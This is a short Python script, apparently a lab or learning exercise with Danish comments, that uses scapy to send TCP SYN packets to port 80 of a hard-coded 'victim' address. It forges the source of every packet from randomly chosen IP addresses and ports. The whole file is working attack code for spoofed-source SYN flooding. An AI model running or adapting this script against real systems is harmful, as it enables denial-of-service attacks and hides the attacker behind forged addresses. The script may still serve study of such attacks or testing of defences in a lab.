#! /usr/bin/env python

from scapy.all import IP, TCP, send  
from random import sample, randrange


def sender():
    victim_ip = '192.168.1.41' 
    #ip_l = [f'192.168.111.{randrange(1, 254)}' for i in range(10)] <-- kan fremgive samme ip 2x
    ip_list = ['192.168.111.' + str(num) for num in sample(range(1, 254), 10)]  #  <-- giver uniq ip 

    for ip_addr in ip_list:
        port_list = sample(range(1024, 65535), 10)
        
        for port in port_list:
            ip_packet = IP(src=ip_addr, dst=victim_ip)
            tcp_packet = TCP(dport=80, sport=port, flags='S')
            syn_packet = ip_packet / tcp_packet
            send(syn_packet)    

sender()
